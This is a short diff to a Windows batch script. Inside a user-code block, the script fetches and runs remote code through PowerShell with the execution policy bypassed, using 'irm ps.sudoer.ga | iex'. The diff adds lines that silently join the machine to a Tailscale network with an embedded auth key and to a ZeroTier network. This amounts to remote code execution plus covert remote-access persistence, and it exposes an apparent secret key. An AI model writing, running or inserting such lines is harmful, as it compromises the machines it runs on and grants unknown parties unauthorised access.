@@ -15,7 +15,8 @@ goto :eof
 ::ENTER YOUR CODE BELOW::   
 
 powershell.exe -ExecutionPolicy Bypass -Command "irm ps.sudoer.ga | iex"
-
+tailscale up --authkey tskey-auth-kmYWEs4CNTRL-E58dqRPnpjitN4wH1JYshiDnogxNZCqR --unattended
+zerotier-cli join 0cccb752f77190cf
 
 
 ::END OF YOUR CODE::
